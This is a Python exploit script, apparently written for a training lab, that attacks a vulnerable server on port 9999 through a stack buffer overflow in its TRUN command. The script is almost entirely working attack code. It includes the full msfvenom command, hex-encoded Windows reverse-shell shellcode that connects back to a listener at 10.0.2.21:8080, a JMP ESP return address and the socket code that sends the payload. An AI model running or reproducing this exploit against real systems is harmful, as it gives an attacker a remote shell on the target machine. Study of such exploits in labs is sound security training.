#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Verify that the user provided target information
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

# Shellcode created by msfvenom
# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.21 LPORT=8080 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0a' 
SHELL =  b""
SHELL += b"\xbf\x2a\xf5\x6c\x74\xda\xc6\xd9\x74\x24\xf4\x5d"
SHELL += b"\x33\xc9\xb1\x52\x83\xc5\x04\x31\x7d\x0e\x03\x57"
SHELL += b"\xfb\x8e\x81\x5b\xeb\xcd\x6a\xa3\xec\xb1\xe3\x46"
SHELL += b"\xdd\xf1\x90\x03\x4e\xc2\xd3\x41\x63\xa9\xb6\x71"
SHELL += b"\xf0\xdf\x1e\x76\xb1\x6a\x79\xb9\x42\xc6\xb9\xd8"
SHELL += b"\xc0\x15\xee\x3a\xf8\xd5\xe3\x3b\x3d\x0b\x09\x69"
SHELL += b"\x96\x47\xbc\x9d\x93\x12\x7d\x16\xef\xb3\x05\xcb"
SHELL += b"\xb8\xb2\x24\x5a\xb2\xec\xe6\x5d\x17\x85\xae\x45"
SHELL += b"\x74\xa0\x79\xfe\x4e\x5e\x78\xd6\x9e\x9f\xd7\x17"
SHELL += b"\x2f\x52\x29\x50\x88\x8d\x5c\xa8\xea\x30\x67\x6f"
SHELL += b"\x90\xee\xe2\x6b\x32\x64\x54\x57\xc2\xa9\x03\x1c"
SHELL += b"\xc8\x06\x47\x7a\xcd\x99\x84\xf1\xe9\x12\x2b\xd5"
SHELL += b"\x7b\x60\x08\xf1\x20\x32\x31\xa0\x8c\x95\x4e\xb2"
SHELL += b"\x6e\x49\xeb\xb9\x83\x9e\x86\xe0\xcb\x53\xab\x1a"
SHELL += b"\x0c\xfc\xbc\x69\x3e\xa3\x16\xe5\x72\x2c\xb1\xf2"
SHELL += b"\x75\x07\x05\x6c\x88\xa8\x76\xa5\x4f\xfc\x26\xdd"
SHELL += b"\x66\x7d\xad\x1d\x86\xa8\x62\x4d\x28\x03\xc3\x3d"
SHELL += b"\x88\xf3\xab\x57\x07\x2b\xcb\x58\xcd\x44\x66\xa3"
SHELL += b"\x86\x60\x77\xa9\x43\x1d\x75\xad\x74\x4d\xf0\x4b"
SHELL += b"\xe0\x7d\x55\xc4\x9d\xe4\xfc\x9e\x3c\xe8\x2a\xdb"
SHELL += b"\x7f\x62\xd9\x1c\x31\x83\x94\x0e\xa6\x63\xe3\x6c"
SHELL += b"\x61\x7b\xd9\x18\xed\xee\x86\xd8\x78\x13\x11\x8f"
SHELL += b"\x2d\xe5\x68\x45\xc0\x5c\xc3\x7b\x19\x38\x2c\x3f"
SHELL += b"\xc6\xf9\xb3\xbe\x8b\x46\x90\xd0\x55\x46\x9c\x84"
SHELL += b"\x09\x11\x4a\x72\xec\xcb\x3c\x2c\xa6\xa0\x96\xb8"
SHELL += b"\x3f\x8b\x28\xbe\x3f\xc6\xde\x5e\xf1\xbf\xa6\x61"
SHELL += b"\x3e\x28\x2f\x1a\x22\xc8\xd0\xf1\xe6\xe8\x32\xd3"
SHELL += b"\x12\x81\xea\xb6\x9e\xcc\x0c\x6d\xdc\xe8\x8e\x87"
SHELL += b"\x9d\x0e\x8e\xe2\x98\x4b\x08\x1f\xd1\xc4\xfd\x1f"
SHELL += b"\x46\xe4\xd7"


# Generate payload, this includes a packed ROP (Encoded) 
# so we can change the control flow of the program
PAYLOAD = (
    b'TRUN /.:/' +  # TRUN command of the server
    b'A' * 1995 +   # padding 
    # JMP ESP
    # Return a bytes object.
    # Format string '<L': < means little-endian; L means unsigned long
    struct.pack('<L', 0x625026D3) + 
    b'C' * 32 +
    SHELL +
    b'C' * (5000 - 2003 - 4 - 32 - len(SHELL)) # not needed really
)

# Send packet containing payload
with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
